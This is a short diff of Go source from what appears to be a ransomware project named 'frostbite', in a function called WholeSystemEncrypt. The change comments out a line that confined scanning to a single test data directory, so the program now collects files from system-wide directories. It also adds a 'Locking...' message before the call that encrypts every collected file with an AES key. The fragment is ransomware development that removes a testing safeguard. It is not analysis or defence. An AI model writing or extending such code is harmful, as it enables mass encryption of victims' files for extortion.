@@ -30,13 +30,14 @@ func WholeSystemEncrypt(aesKey []byte, encryptedAesKey []byte) {
 	timeNow := time.Now()
 
 	dirsToScan = generateListOfDirsToScan(dirsToScan, dirsToRemove)
-	dirsToScan = []string{"/home/dejan/dev/go/malware/frostbite/data"}
+	// dirsToScan = []string{"/home/dejan/dev/go/malware/frostbite/data"}
 	pl("dirsToScan: ", dirsToScan)
 
 	runtime.GOMAXPROCS(runtime.NumCPU() / 2)
 	//listen for channel and append to filesToEncrypt
 	filesToEncrypt = getAllFiles(dirsToScan, filesToEncrypt)
 	//encrypt files
+	pl("Locking...")
 	file.LockFilesArray(filesToEncrypt, aesKey, encryptedAesKey)
 
 	timeEnd := time.Now()
